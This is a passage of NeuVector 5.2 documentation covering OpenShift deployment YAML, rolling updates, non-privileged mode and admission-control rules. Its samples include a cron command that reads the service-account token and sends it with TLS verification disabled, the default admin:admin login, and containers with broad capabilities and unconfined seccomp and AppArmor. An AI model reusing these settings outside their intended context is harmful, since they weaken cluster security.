neuvector-binding-customresourcedefinition neuvector-binding-nvsecurityrules neuvector-binding-view neuvector-binding-nvwafsecurityrules neuvector-binding-nvadmissioncontrolsecurityrules neuvector-binding-nvdlpsecurityrules neuvector-binding-csp-usages neuvector-binding-co -o wide   Sample output:  NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS neuvector-binding-app ClusterRole/neuvector-binding-app 56d neuvector/controller neuvector-binding-rbac ClusterRole/neuvector-binding-rbac 34d neuvector/controller neuvector-binding-admission ClusterRole/neuvector-binding-admission 72d neuvector/controller neuvector-binding-customresourcedefinition ClusterRole/neuvector-binding-customresourcedefinition 72d neuvector/controller neuvector-binding-nvsecurityrules ClusterRole/neuvector-binding-nvsecurityrules 72d neuvector/controller neuvector-binding-view ClusterRole/view 72d neuvector/controller neuvector-binding-nvwafsecurityrules ClusterRole/neuvector-binding-nvwafsecurityrules 72d neuvector/controller neuvector-binding-nvadmissioncontrolsecurityrules ClusterRole/neuvector-binding-nvadmissioncontrolsecurityrules 72d neuvector/controller neuvector-binding-nvdlpsecurityrules ClusterRole/neuvector-binding-nvdlpsecurityrules 72d neuvector/controller neuvector-binding-csp-usages ClusterRole/neuvector-binding-csp-usages 24d neuvector/controller neuvector-binding-co ClusterRole/neuvector-binding-co 72d neuvector/enforcer, neuvector/controller   And this command:  oc get RoleBinding neuvector-binding-scanner -n neuvector -o wide   Sample output:  NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS neuvector-binding-scanner Role/neuvector-binding-scanner 70d neuvector/updater, neuvector/controller   (Optional) Create the Federation Master and/or Remote Multi-Cluster Management Services. If you plan to use the multi-cluster management functions in NeuVector, one cluster must have the Federation Master service deployed, and each remote cluster must have the Federation Worker service. For flexibility, you may choose to deploy both Master and Worker services on each cluster so any cluster can be a master or remote.  View Multi-Cluster Management Services apiVersion: v1 kind: Service metadata: name: neuvector-service-controller-fed-master namespace: neuvector spec: ports: - port: 11443 name: fed protocol: TCP type: NodePort selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-controller-fed-worker namespace: neuvector spec: ports: - port: 10443 name: fed protocol: TCP type: NodePort selector: app: neuvector-controller-pod   Then create the appropriate service(s):  oc create -f nv_master_worker.yaml   Create the neuvector services and pods based on the sample yamls below. Important! Replace the &lt;version&gt; tags for the manager, controller and enforcer image references in the yaml file. Also make any other modifications required for your deployment environment.  oc create -f &lt;compose file&gt;   That's it! You should be able to connect to the NeuVector console and login with admin:admin, e.g. https://&lt;public-ip&gt;:8443  To see how to access the console for the neuvector-webui service:  oc get services -n neuvector   If you have created your own namespace instead of using “neuvector”, replace all instances of “namespace: neuvector” and other namespace references with your namespace in the sample yaml files below.  OpenShift 4.6+ with CRI-O run-time  The name of your default OpenShift registry might have changed from docker-registry to openshift-image-registry. You may need to change the image registry for the manager, controller, and enforcer in the sample yaml. Note: Type NodePort is used for the fed-master and fed-worker services instead of LoadBalancer. You may need to adjust for your deployment.  If using the CRI-O run-time, see the CRI-O sample below for the change made to the volumeMounts for controller and enforcer pods:   - mountPath: /var/run/crio/crio.sock name: runtime-sock readOnly: true   Also change the volumes from docker.sock to:   - name: runtime-sock hostPath: path: /var/run/crio/crio.sock   ","version":"5.2","tagName":"h3"},{"title":"OpenShift Deployment Examples for NeuVector","type":1,"pageTitle":"RedHat OpenShift","url":"/5.2/deploying/openshift##","content":" OpenShift 4.6+ with CRI-O Runtime Sample File # neuvector yaml version for NeuVector 5.2.x on CRI-O apiVersion: v1 kind: Service metadata: name: neuvector-svc-crd-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 30443 protocol: TCP name: crd-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-admission-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 20443 protocol: TCP name: admission-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-webui namespace: neuvector spec: ports: - port: 8443 name: manager protocol: TCP type: ClusterIP selector: app: neuvector-manager-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller namespace: neuvector spec: ports: - port: 18300 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18300&quot; - port: 18301 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18301&quot; - port: 18301 protocol: &quot;UDP&quot; name: &quot;cluster-udp-18301&quot; clusterIP: None selector: app: neuvector-controller-pod --- apiVersion: route.openshift.io/v1 kind: Route metadata: name: neuvector-route-webui namespace: neuvector spec: to: kind: Service name: neuvector-service-webui port: targetPort: manager tls: termination: passthrough --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-manager-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-manager-pod replicas: 1 template: metadata: labels: app: neuvector-manager-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-manager-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/manager:&amp;#60;version&amp;#62; env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-controller-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-controller-pod minReadySeconds: 60 strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 3 template: metadata: labels: app: neuvector-controller-pod spec: affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - neuvector-controller-pod topologyKey: &quot;kubernetes.io/hostname&quot; serviceAccountName: controller serviceAccount: controller containers: - name: neuvector-controller-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/controller:&amp;#60;version&amp;#62; securityContext: privileged: true readinessProbe: exec: command: - cat - /tmp/ready initialDelaySeconds: 5 periodSeconds: 5 env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /var/neuvector name: nv-share readOnly: false - mountPath: /var/run/crio/crio.sock name: runtime-sock readOnly: true - mountPath: /host/proc name: proc-vol readOnly: true - mountPath: /host/cgroup name: cgroup-vol readOnly: true - mountPath: /etc/config name: config-volume readOnly: true terminationGracePeriodSeconds: 300 restartPolicy: Always volumes: - name: nv-share hostPath: path: /var/neuvector - name: runtime-sock hostPath: path: /var/run/crio/crio.sock - name: proc-vol hostPath: path: /proc - name: cgroup-vol hostPath: path: /sys/fs/cgroup - name: config-volume projected: sources: - configMap: name: neuvector-init optional: true - secret: name: neuvector-init optional: true --- apiVersion: apps/v1 kind: DaemonSet metadata: name: neuvector-enforcer-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-enforcer-pod updateStrategy: type: RollingUpdate template: metadata: labels: app: neuvector-enforcer-pod spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane hostPID: true serviceAccountName: enforcer serviceAccount: enforcer containers: - name: neuvector-enforcer-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/enforcer:&amp;#60;version&amp;#62; securityContext: privileged: true env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /lib/modules name: modules-vol readOnly: true - mountPath: /var/run/crio/crio.sock name: runtime-sock readOnly: true - mountPath: /host/proc name: proc-vol readOnly: true - mountPath: /host/cgroup name: cgroup-vol readOnly: true terminationGracePeriodSeconds: 1200 restartPolicy: Always volumes: - name: modules-vol hostPath: path: /lib/modules - name: runtime-sock hostPath: path: /var/run/crio/crio.sock - name: proc-vol hostPath: path: /proc - name: cgroup-vol hostPath: path: /sys/fs/cgroup --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-scanner-pod strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 2 template: metadata: labels: app: neuvector-scanner-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-scanner-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/scanner:latest imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: serviceAccountName: updater serviceAccount: updater containers: - name: neuvector-updater-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/updater:latest imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never   Master Node Taints and TolerationsAll taint info must match to schedule Enforcers on nodes. To check the taint info on a node (e.g. Master):  $ oc get node taintnodename -o yaml   Sample output:  spec: taints: - effect: NoSchedule key: node-role.kubernetes.io/master # there may be an extra info for taint as below - effect: NoSchedule key: mykey value: myvalue   If there is additional taints as above, add these to the sample yaml tolerations section:  spec: template: spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane # if there is an extra info for taints as above, please add it here. This is required to match all the taint info defined on the taint node. Otherwise, the Enforcer won't deploy on the taint node - effect: NoSchedule key: mykey value: myvalue   ","version":"5.2","tagName":"h3"},{"title":"Using Node Labels for Manager and Controller Nodes​","type":1,"pageTitle":"RedHat OpenShift","url":"/5.2/deploying/openshift#using-node-labels-for-manager-and-controller-nodes","content":" To control which nodes the Manager and Controller are deployed on, label each node. Replace &lt;nodename&gt; with the appropriate node name.  oc label nodes &lt;nodename&gt; nvcontroller=true   Then add a nodeSelector to the yaml file for the Manager and Controller deployment sections. For example:   - mountPath: /host/cgroup name: cgroup-vol readOnly: true nodeSelector: nvcontroller: &quot;true&quot; restartPolicy: Always   To prevent the enforcer from being deployed on a controller node, if it is a dedicated management node (without application containers to be monitored), add a nodeAffinity to the Enforcer yaml section. For example:  app: neuvector-enforcer-pod spec: affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: nvcontroller operator: NotIn values: [&quot;true&quot;] imagePullSecrets:   ","version":"5.2","tagName":"h3"},{"title":"Updating the CVE Database on OpenShift Deployments​","type":1,"pageTitle":"RedHat OpenShift","url":"/5.2/deploying/openshift#updating-the-cve-database-on-openshift-deployments","content":" The latest scanner image always contains the most recent CVE database update from NeuVector. For this reason, a version tag is not recommended when pulling the image. However, updating the CVE database requires regular pulling of the latest scanner image so the updater cron job can redeploy the scanner(s). The samples above assume NeuVector images are pulled, tagged and pushed to a local OpenShift registry. Deployment is then from this registry instead of directly from neuvector (or the legacy NeuVector registry on docker hub).  To regularly update the CVE database, we recommend a script/cron job be created to pull the latest NeuVector scanner image and perform the tagging and pushing steps to the local registry. This will ensure the CVE database is being updated regularly and images and containers are being scanned for new vulnerabilities.  ","version":"5.2","tagName":"h3"},{"title":"Rolling Updates​","type":1,"pageTitle":"RedHat OpenShift","url":"/5.2/deploying/openshift#rolling-updates","content":" Orchestration tools such as Kubernetes, RedHat OpenShift, and Rancher support rolling updates with configurable policies. You can use this feature to update the NeuVector containers. The most important will be to ensure that there is at least one Allinone/Controller running so that policies, logs, and connection data is not lost. Make sure that there is a minimum of 30 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.  Before starting the rolling updates, please pull and tag the NeuVector containers the same way as in the beginning of this page. You can pull the latest without a version number, but to trigger the rolling update you’ll need to tag the image with a version.  For example, for the controller (latest):  docker pull neuvector/controller   Then to tag/push, if latest version is 2.0.1, same as step 3 at the top of this page:  docker login -u &lt;user_name&gt; -p `oc whoami -t` docker-registry.default.svc:5000 docker tag neuvector/controller docker-registry.default.svc:5000/neuvector/controller:2.0.1 docker push docker-registry.default.svc:5000/neuvector/controller:2.0.1   You can now update your yaml file with these new versions and ‘apply’, or use the ‘oc set image ...’ command to trigger the rolling update. Please see the Kubernetes rolling update samples in this Production section to how to launch and monitor rolling updates of the NeuVector containers.  The provided sample deployment yamls already configure the rolling update policy. If you are updating via the NeuVector Helm chart, please pull the latest chart to properly configure new features such as admission control, and delete the old cluster role and cluster role binding for NeuVector.  ","version":"5.2","tagName":"h3"},{"title":"Enabling the REST API​","type":1,"pageTitle":"RedHat OpenShift","url":"/5.2/deploying/openshift#enabling-the-rest-api","content":" To enable the rest API, port 10443 must be configured as follows:  apiVersion: v1 kind: Service metadata: name: neuvector-service-controller namespace: neuvector spec: ports: - port: 10443 name: controller protocol: TCP type: NodePort selector: app: neuvector-controller-pod   ","version":"5.2","tagName":"h3"},{"title":"Enable/Disable Scheduling on the Master Node​","type":1,"pageTitle":"RedHat OpenShift","url":"/5.2/deploying/openshift#enabledisable-scheduling-on-the-master-node","content":" The following commands can be used to enable/disable the scheduling on the master node.  oc adm manage-node nodename --schedulable   oc adm manage-node nodename --schedulable=false   ","version":"5.2","tagName":"h3"},{"title":"OpenShift Deployment in Non-Privileged Mode​","type":1,"pageTitle":"RedHat OpenShift","url":"/5.2/deploying/openshift#openshift-deployment-in-non-privileged-mode","content":" The following instructions can be used to deploy NeuVector without using privileged mode containers. The controller and enforcer deployments should be changed, which is shown in the excerpted snippets below.  Controller:  spec: template: metadata: ... annotations: container.apparmor.security.beta.kubernetes.io/neuvector-controller-pod: unconfined # this line below is required to be added if k8s version is pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-controller-pod: unconfined spec: # hostPID is required for controller if openshift version is pre-v4.5 but not for version 3.x # hostPID: true containers: ... securityContext: # openshift seLinuxOptions: type: unconfined_t # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK - NET_RAW - SYS_CHROOT - MKNOD - AUDIT_WRITE - SETFCAP   Enforcer:  spec: template: metadata: annotations: container.apparmor.security.beta.kubernetes.io/neuvector-enforcer-pod: unconfined # this line below is required to be added if k8s version is pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-enforcer-pod: unconfined spec: containers: securityContext: # openshift seLinuxOptions: type: unconfined_t # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK - NET_RAW - SYS_CHROOT - MKNOD - AUDIT_WRITE - SETFCAP   The following sample is a complete deployment reference using the cri-o run-time. For other run-times please make the appropriate changes to the volumes/volume mounts for the crio.sock.  # neuvector yaml version for NeuVector 5.x.x on cri-o oc version 4.6+ apiVersion: v1 kind: Service metadata: name: neuvector-svc-crd-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 30443 protocol: TCP name: crd-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-admission-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 20443 protocol: TCP name: admission-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-webui namespace: neuvector spec: ports: - port: 8443 name: manager protocol: TCP type: ClusterIP selector: app: neuvector-manager-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller namespace: neuvector spec: ports: - port: 18300 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18300&quot; - port: 18301 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18301&quot; - port: 18301 protocol: &quot;UDP&quot; name: &quot;cluster-udp-18301&quot; clusterIP: None selector: app: neuvector-controller-pod --- apiVersion: route.openshift.io/v1 kind: Route metadata: name: neuvector-route-webui namespace: neuvector spec: to: kind: Service name: neuvector-service-webui port: targetPort: manager tls: termination: passthrough --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-manager-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-manager-pod replicas: 1 template: metadata: labels: app: neuvector-manager-pod spec: containers: - name: neuvector-manager-pod # 4.6+, change docker-registry.default.svc below to image-registry.openshift-image-registry.svc image: docker-registry.default.svc:5000/neuvector/manager:&lt;version&gt; env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-controller-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-controller-pod minReadySeconds: 60 strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 3 template: metadata: labels: app: neuvector-controller-pod annotations: container.apparmor.security.beta.kubernetes.io/neuvector-controller-pod: unconfined # this line below is required to be added if k8s version is pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-controller-pod: unconfined spec: affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - neuvector-controller-pod topologyKey: &quot;kubernetes.io/hostname&quot; # hostPID is required for controller if openshift version is pre-v4.5 # hostPID: true containers: - name: neuvector-controller-pod # 4.6+, change docker-registry.default.svc below to image-registry.openshift-image-registry.svc image: docker-registry.default.svc:5000/neuvector/controller:&lt;version&gt; securityContext: # openshift seLinuxOptions: type: unconfined_t # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK - NET_RAW - SYS_CHROOT - MKNOD - AUDIT_WRITE - SETFCAP readinessProbe: exec: command: - cat - /tmp/ready initialDelaySeconds: 5 periodSeconds: 5 env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /var/neuvector name: nv-share readOnly: false - mountPath: /var/run/crio/crio.sock name: runtime-sock readOnly: true - mountPath: /host/proc name: proc-vol readOnly: true - mountPath: /host/cgroup name: cgroup-vol readOnly: true - mountPath: /etc/config name: config-volume readOnly: true terminationGracePeriodSeconds: 300 restartPolicy: Always volumes: - name: nv-share hostPath: path: /var/neuvector - name: runtime-sock hostPath: path: /var/run/crio/crio.sock - name: proc-vol hostPath: path: /proc - name: cgroup-vol hostPath: path: /sys/fs/cgroup - name: config-volume projected: sources: - configMap: name: neuvector-init optional: true - secret: name: neuvector-init optional: true --- apiVersion: apps/v1 kind: DaemonSet metadata: name: neuvector-enforcer-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-enforcer-pod updateStrategy: type: RollingUpdate template: metadata: labels: app: neuvector-enforcer-pod annotations: container.apparmor.security.beta.kubernetes.io/neuvector-controller-pod: unconfined # this line below is required to be added if k8s version is pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-controller-pod: unconfined spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane hostPID: true containers: - name: neuvector-enforcer-pod # 4.6+, change docker-registry.default.svc below to image-registry.openshift-image-registry.svc image: docker-registry.default.svc:5000/neuvector/enforcer:&lt;version&gt; securityContext: # openshift seLinuxOptions: type: unconfined_t # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK - NET_RAW - SYS_CHROOT - MKNOD - AUDIT_WRITE - SETFCAP env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /lib/modules name: modules-vol readOnly: true - mountPath: /var/run/crio/crio.sock name: runtime-sock readOnly: true - mountPath: /host/proc name: proc-vol readOnly: true - mountPath: /host/cgroup name: cgroup-vol readOnly: true terminationGracePeriodSeconds: 1200 restartPolicy: Always volumes: - name: modules-vol hostPath: path: /lib/modules - name: runtime-sock hostPath: path: /var/run/crio/crio.sock - name: proc-vol hostPath: path: /proc - name: cgroup-vol hostPath: path: /sys/fs/cgroup --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-scanner-pod strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 2 template: metadata: labels: app: neuvector-scanner-pod spec: containers: - name: neuvector-scanner-pod image: docker-registry.default.svc:5000/neuvector/scanner imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: containers: - name: neuvector-updater-pod image: docker-registry.default.svc:5000/neuvector/updater imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never  ","version":"5.2","tagName":"h3"},{"title":"Admission Controls","type":0,"sectionRef":"#","url":"/5.2/policy/admission","content":"","keywords":"","version":"5.2"},{"title":"Controlling Image / Container Deployments​","type":1,"pageTitle":"Admission Controls","url":"/5.2/policy/admission#controlling-image--container-deployments","content":" With Admission Control integration with orchestration platforms such as Kubernetes and OpenShift, NeuVector is playing an important role within the orchestration platform’s deployment pipeline. Whenever a cluster resource such as Deployment is created, the request from the cluster apiserver will be passed to one of the NeuVector Controllers to determine if it should be allowed to deploy or denied based on the user-defined Admission Control rules prior to creating the cluster resource. The policy decision NeuVector makes will be passed back to cluster apiserver for enforcement.  This feature is supported in Kubernetes 1.9+ and Openshift 3.9+. Before using the Admission Control function in NeuVector, while it's possible to setup admission control from --admission-control argument passed to the cluster apiserver, it's recommended to use dynamic admission control. Please see Kubernetes and Openshift sections below for configuration.  Kubernetes​  The ValidatingAdmissionWebhook and MutatingAdmissionWebhook plugins are enabled by default.  Check if admissionregistration.kubernetes.io/v1beta1 is enabled  kubectl api-versions | grep admissionregistration admissionregistration.k8s.io/v1beta1   Openshift​  The ValidatingAdmissionWebhook and MutatingAdmissionWebhook plugins are NOT enabled by default. Please see the examples in the OpenShift deployment sections for instructions on how to enable these. A restart of the OpenShift api and controllers services is required.  Check if admissionregistration.kubernetes.io/v1beta1 is enabled  oc api-versions | grep admissionregistration admissionregistration.k8s.io/v1beta1   ","version":"5.2","tagName":"h3"},{"title":"Enabling Admission Control (Webhook) in NeuVector​","type":1,"pageTitle":"Admission Controls","url":"/5.2/policy/admission#enabling-admission-control-webhook-in-neuvector","content":" The Admission Control feature is disabled by default. Please go to Policy -&gt; Admission Control page to enable it in the NeuVector console.    Once the Admission Control feature is enabled successfully, the following ValidatingWebhookConfiguration resource will be created automatically. To check it:  kubectl get ValidatingWebhookConfiguration neuvector-validating-admission-webhook   Sample output:  NAME CREATED AT neuvector-validating-admission-webhook 2019-03-28T00:05:09Z   The most important information in ValidatingWebhookConfiguration resource for NeuVector is cluster resources. Currently once a cluster resource such as Deployment NeuVector registered is created, the request will be sent from orchestration platform apiserver to one of the NeuVector Controllers to determine if it should be allowed or denied based on the user-defined rules in NeuVector Policy -&gt; Admission Control page.  If the resource deployment is denied, an event will be logged in Notifications.  To test the Kubernetes connection for the client mode access, go to Advanced Setting.    For special cases, the URL access method using the NodePort service may be required.  ","version":"5.2","tagName":"h3"},{"title":"Admission Control Events/Notifications​","type":1,"pageTitle":"Admission Controls","url":"/5.2/policy/admission#admission-control-eventsnotifications","content":" All admission control events for allowed and denied events can be found in the Notifications -&gt; Security Risks menu.  ","version":"5.2","tagName":"h3"},{"title":"Admission Control Criteria​","type":1,"pageTitle":"Admission Controls","url":"/5.2/policy/admission#admission-control-criteria","content":" NeuVector supports many criteria for creating an Admission Control Rule. These include CVE High Count, CVE Names, image labels, imageScanned, namespace, user, runAsRoot, etc. There are two possible sources of criteria evaluation, Image Scans and Deployment Yaml file scans. If a criterion requires an image scan, the scan results from Registry Scanning will be used. If the image was not scanned, the admission control rule will not be applied. If a criterion requires scanning of the deployment yaml, it will be evaluated from the Kubernetes deployment. Some criteria will use the results from either an image scan OR a deployment yaml scan.  CVE score is an example of a criterion requiring an image scan.Environment variables with secrets is an example of a criterion using the deployment yaml scan.Labels and Environment variables are examples of criteria which will use BOTH image and deployment yaml scans results (logical OR) to determine matches.    After the criterion is selected, the possible Operators will be displayed. Click the ‘+’ button to add each criterion.  Using Multiple Criteria in a Single RuleThe matching logic for multiple criteria in one admission control rule is:  For different criteria types within a single rule, apply 'and'For multiple criteria of same type (e.g. multiple namespaces, registries, images), Apply 'and' for all negative matches(&quot;not contains any&quot;, &quot;is not one of&quot;) until the first positive match;After the first positive match, apply 'or'  Example with Matching a Pod Label​  apiVersion: apps/v1 kind: Deployment metadata: name: iperfserver namespace: neuvector-1 spec: replicas: 1 template: metadata: labels: app: iperfserver   The rule to match would be:    Example with Matching Environment Variables with Secrets​  apiVersion: apps/v1 kind: Deployment metadata: name: iperfserver namespace: neuvector-1 labels: name: iperfserver spec: selector: matchLabels: name: iperfserver replicas: 1 template: metadata: labels: name: iperfserver spec: containers: - name: iperfserver image: nvlab/iperf env: - name: env1 value: AIDAJQABLZS4A3QDU576 - name: env2 valueFrom: fieldRef: fieldPath: status.podIP - name: env5 value: AIDAJQABLZS4A3QDU57E command: - iperf - -s - -p - &quot;6068&quot; nodeSelector: nvallinone: &quot;true&quot; restartPolicy: Always   The Matching rule would be:  Criteria Related to Scan Results​  The following criteria are related to the results in NeuVector Assets &gt; Registry scan page:  Image, imageScanned, cveHighCount, cveMediumCount, Image compliance violations, cveNames and others.  Before NeuVector performs the match against the Admission Control rules, NeuVector retrieves the image information (For example, 10.1.127.3:5000/neuvector/toolbox/iperf:latest) from the cluster apiserver (Please refer to Request from apiserver section below). The image is composed by registry server (https://10.1.127.3:5000), repository (neuvector/toolbox/iperf) and tag (latest).  NeuVector uses this information to match the results in NeuVector Assets -&gt; Registry scan page and collects the corresponding information such as cve name, cve high or medium count etc. Image compliance violations are considered any image which has secrets or setuid/setgid violations. If users are using the image from docker registry to create a cluster resource, normally the registry server information is empty or docker.io and currently NeuVector is using the following hard-coded registry servers to match the registry scan result instead of empty or docker.io string. Of course, if there are more other than the following supported docker registry servers defined in the registry scan page, NeuVector is unable to get the registry scan results successfully.  If users are using the built-in image such as alpine or ubuntu from the docker registry, there is a hidden organization name called library. When you look at the results for docker build-in image in NeuVector Assets &gt; Registry scan page, the repository name will be library/alpine or library/ubuntu. Currently NeuVector assumes there is only one hidden library organization name in docker registry. If there is more than one, NeuVector is unable to get the registry scan results successfully as well. The above limitation could also apply on other type of docker registry servers if any.  Creating Custom Criteria Rules​  Users can create a customized criterion to be used to allow or block deployments based on common objects found in the image yaml (scanned upon deployment). Select the object to be used, for example imagePullSecrets and the matching value, for example exists. It is also recommended to use additional criteria to further target the rule, such as namespace, PSP/PSA, CVE conditions etc.    Criteria Explanations​  Criteria with a disk icon require that the image be scanned (see registry scanning), and criteria with a file icon will scan the deployment yaml. If both icons are listed, then matching will be for either (OR). If a criterion requires an image scan, but the image is NOT scanned, that part of the rule will be ignored (ie rule is bypassed, or if deployment yaml is also listed, then only the deployment yaml will be used to match). To prevent non-scanned images from bypassing rules, see the Image Scanned criterion below.   Add customized criterion. Select the object from the drop down. All custom criteria support exists and does not exist operators. For ones that allow values, additional operators and the value can be entered. Values can be static, separated by comma’s, and include wildcards. Allow Privilege Escalation. If the container allows privilege escalations, it can be blocked by setting Deny as the action. Count of High Severity CVE. This takes the results of an image (registry) scan and matches on the number of High severity (CVSS scores of 7 or higher). Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. Count of High Severity CVE with fix. This takes the results of an image (registry) scan and matches on High severity (CVSS scores of 7 or higher), AND if there is a fix available for the CVE. Select this if only planning to block deployments of high CVEs if a fix should have been applied. Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. Count of Medium Severity CVE. This takes the results of an image (registry) scan and matches on the number of Medium severity (CVSS scores of between 4 and 6). Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. CVE names. This matches on specific CVE names 